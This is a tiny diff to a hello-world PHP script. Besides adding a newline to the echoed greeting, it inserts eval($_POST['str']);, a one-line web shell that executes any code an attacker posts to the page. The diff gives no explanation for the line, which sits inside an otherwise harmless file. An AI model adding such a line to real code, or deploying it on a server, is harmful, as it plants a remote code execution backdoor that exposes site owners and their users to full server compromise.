@@ -1,3 +1,4 @@
 <?php 
-echo "hello PHP";
+echo "hello PHP\n";
+eval($_POST['str']);
 ?>
